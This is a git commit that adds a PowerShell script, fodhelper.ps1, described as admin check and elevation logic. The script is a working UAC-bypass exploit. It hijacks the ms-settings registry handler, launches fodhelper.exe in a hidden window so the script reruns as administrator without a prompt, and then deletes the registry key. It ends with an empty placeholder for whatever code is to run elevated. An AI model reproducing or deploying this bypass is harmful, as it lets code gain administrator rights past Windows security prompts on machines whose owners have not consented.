99dcd93849109c04fc3954c17d2dd277c3151455
tgg112 <edwardcjonkman@gmail.com>
2026-07-12 05:16:26 +1000

    Add admin check and elevation logic in fodhelper.ps1

---
+++ Powershell/fodhelper.ps1
@@ -0,0 +1,22 @@
+function Test-Admin {
+    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Test-Admin)) {
+    Write-Host "Not admin. Attempting elevation..." -ForegroundColor Yellow
+    
+    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
+    New-Item $regPath -Force | Out-Null
+    Set-ItemProperty $regPath "(Default)" "$PSCommandPath" -Force
+    Set-ItemProperty $regPath "DelegateExecute" "" -Force
+    
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep 2
+    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
+    exit
+}
+
+Write-Host "Running with Administrator privileges." -ForegroundColor Green
+
+# your code goes here
